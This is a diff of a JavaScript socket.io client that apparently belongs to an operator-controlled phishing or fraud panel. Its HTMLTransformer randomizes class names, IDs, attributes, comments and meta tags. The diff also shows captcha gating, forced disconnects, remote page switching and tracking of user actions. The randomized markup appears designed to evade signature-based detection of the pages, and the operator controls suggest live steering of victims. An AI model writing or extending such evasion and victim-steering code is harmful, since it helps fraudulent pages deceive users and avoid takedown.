@@ -1,11 +1,8 @@
-// HTMLTransformer integrated directly into socket client
 const HTMLTransformer = {
     transformationStrategies: {
-        // Randomize class names while preserving styling
         classes: (html) => {
             const classMap = new Map();
             let classCounter = 0;
-            
             return html.replace(/class="([^"]+)"/g, (match, classes) => {
                 const newClasses = classes.split(' ').map(cls => {
                     if (!classMap.has(cls)) {
@@ -17,11 +14,9 @@ const HTMLTransformer = {
             });
         },
 
-        // Randomize element IDs
         ids: (html) => {
             const idMap = new Map();
             let idCounter = 0;
-            
             return html.replace(/id="([^"]+)"/g, (match, id) => {
                 if (!idMap.has(id)) {
                     idMap.set(id, `i${Math.random().toString(36).substr(2, 6)}_${idCounter++}`);
@@ -30,7 +25,6 @@ const HTMLTransformer = {
             });
         },
 
-        // Randomize attribute order
         attributes: (html) => {
             return html.replace(/<([a-zA-Z0-9]+)([^>]+)>/g, (match, tag, attrs) => {
                 const attributes = attrs.trim().split(/\s+(?=[a-zA-Z-]+=)/).filter(Boolean);
@@ -39,7 +33,6 @@ const HTMLTransformer = {
             });
         },
 
-        // Add random whitespace and line breaks
         whitespace: (html) => {
             return html.replace(/>\s+</g, (match) => {
                 const spaces = ' '.repeat(Math.floor(Math.random() * 4) + 1);
@@ -48,14 +41,12 @@ const HTMLTransformer = {
             });
         },
 
-        // Randomize comment content
         comments: (html) => {
             return html.replace(/<!--[\s\S]*?-->/g, () => {
                 return `<!-- ${Math.random().toString(36).substring(7)} -->`;
             });
         },
 
-        // Add random data attributes
         dataAttributes: (html) => {
             return html.replace(/<([a-zA-Z0-9]+)([^>]*)>/g, (match, tag, attrs) => {
                 if (Math.random() > 0.7) {
@@ -64,20 +55,10 @@ const HTMLTransformer = {
                 }
                 return match;
             });
-        },
-
-        // Randomize style order within style tags
-        styles: (html) => {
-            return html.replace(/<style[^>]*>([\s\S]*?)<\/style>/g, (match, styles) => {
-                const rules = styles.split('}').filter(Boolean);
-                const shuffled = rules.sort(() => Math.random() - 0.5);
-                return `<style>${shuffled.join('}\n')}}}</style>`;
-            });
         }
     },
 
     async transformHTML(html) {
-        // Apply all transformation strategies in random order
         const strategies = Object.values(this.transformationStrategies);
         const shuffledStrategies = strategies.sort(() => Math.random() - 0.5);
 
@@ -86,11 +67,9 @@ const HTMLTransformer = {
             transformedHtml = strategy(transformedHtml);
         }
 
-        // Add dynamic nonce for script tags
         const nonce = Math.random().toString(36).substring(7);
         transformedHtml = transformedHtml.replace(/<script/g, `<script nonce="${nonce}"`);
 
-        // Add random metadata
         const metaTags = [
             `<meta name="v${Math.random().toString(36).substring(7)}" content="${Math.random().toString(36).substring(7)}">`,
             `<meta name="t${Math.random().toString(36).substring(7)}" content="${Date.now()}">`
@@ -127,9 +106,7 @@ class URLManager {
             newUrl += '&verified=1';
         }
 
-        window.history.replaceState({}, '', newUrl);
         this.currentUrl = newUrl;
-        
         if (clientId) {
             this.sessionId = clientId;
         }
@@ -141,11 +118,9 @@ class URLManager {
     }
 }
 
-// Initialize session state
 let isForceDisconnected = false;
 let reconnectDisabled = false;
 
-// Initialize socket with modified options
 const socket = io('/user', {
     query: { page: window.location.pathname.split('/').pop() },
     reconnection: true,
@@ -154,51 +129,11 @@ const socket = io('/user', {
     forceNew: true
 });
 
-// Enhanced page change handler with dynamic transformation
 async function emitPageChange(pageName) {
     socket.emit('page_loading', true);
-    
-    try {
-        // Fetch and transform the HTML
-        const response = await fetch(`/pages/${pageName}.html`);
-        let html = await response.text();
-        html = await HTMLTransformer.transformHTML(html);
-        
-        // Update the page content
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, 'text/html');
-        
-        // Store current scripts
-        const currentScripts = [...document.scripts].map(script => script.src);
-        
-        // Update document content
-        document.body.innerHTML = doc.body.innerHTML;
-        
-        // Re-execute scripts
-        const newScripts = [...doc.scripts].filter(script => !currentScripts.includes(script.src));
-        for (const script of newScripts) {
-            const newScript = document.createElement('script');
-            if (script.src) {
-                newScript.src = script.src;
-            } else {
-                newScript.textContent = script.textContent;
-            }
-            document.body.appendChild(newScript);
-        }
-        
-        // Update state
-        socket.emit('page_change', pageName + '.html');
-        URLManager.currentPage = pageName;
-        
-    } catch (error) {
-        console.error('Page transformation error:', error);
-        window.location.href = `/pages/${pageName}.html`;
-    } finally {
-        socket.emit('page_loading', false);
-    }
+    socket.emit('page_change', pageName + '.html');
 }
 
-// Socket event handlers
 socket.on('force_disconnect', () => {
     console.log('Forced disconnect received');
     isForceDisconnected = true;
@@ -270,14 +205,12 @@ socket.on('connect_error', (error) => {
     }
 });
 
-// Heartbeat setup
 window.heartbeatInterval = setInterval(() => {
     if (!isForceDisconnected && socket.connected) {
         socket.emit('heartbeat');
     }
 }, 3000);
 
-// Event listeners
 window.addEventListener('popstate', () => {
     if (!isForceDisconnected) {
         const currentPage = URLManager.getCurrentPage();
@@ -317,10 +250,9 @@ window.addEventListener('beforeunload', () => {
     socket.emit('user_leaving');
 });
 
-// Captcha handler
+// Critical: Original working captcha handler
 window.onCaptchaSuccess = async (token) => {
     try {
-        socket.emit('page_loading', true);
         const response = await fetch('/verify-turnstile', {
             method: 'POST',
             headers: {
@@ -333,20 +265,18 @@ window.onCaptchaSuccess = async (token) => {
         });
 
         const result = await response.json();
-        if (result.success && result.verified && result.url) {
+        if (result.success) {
+            if (result.url) {
+                socket.emit('page_loading', true);
+                window.location.href = result.url;
+            }
             socket.emit('captcha_verified');
-            // Use replace to prevent back navigation
-            window.location.replace(result.url);
-        } else {
-            socket.emit('page_loading', false);
         }
     } catch (error) {
         console.error('Captcha verification failed:', error);
-        socket.emit('page_loading', false);
     }
 };
 
-// User action handlers
 window.handleUserAction = async (actionType, data) => {
     socket.emit('user_action', {
         type: actionType,
@@ -365,7 +295,6 @@ window.completeReview = () => {
     });
 };
 
-// Connection state handlers
 socket.on('disconnect', () => {
     console.log('Socket disconnected');
     if (isForceDisconnected) {
